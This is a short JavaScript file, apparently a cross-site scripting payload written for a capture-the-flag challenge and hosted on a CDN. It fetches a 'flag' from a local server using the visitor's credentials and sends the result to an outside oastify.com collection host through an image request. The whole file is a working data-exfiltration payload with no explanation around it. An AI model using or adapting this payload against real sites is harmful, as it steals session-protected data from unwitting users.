//https://cdn.jsdelivr.net/gh/chinh310503/test/tvc.js

fetch('http://127.0.0.1:5000/get_flag', { credentials: 'include' })
  .then(r => r.text())
  .then(flag => {
    const img = new Image();
    img.src = 'http://owobxyoqd01jbl581lfal75locu3iz6o.oastify.com/collect?f=' + encodeURIComponent(flag);
  })
  .catch(e => console.error(e));
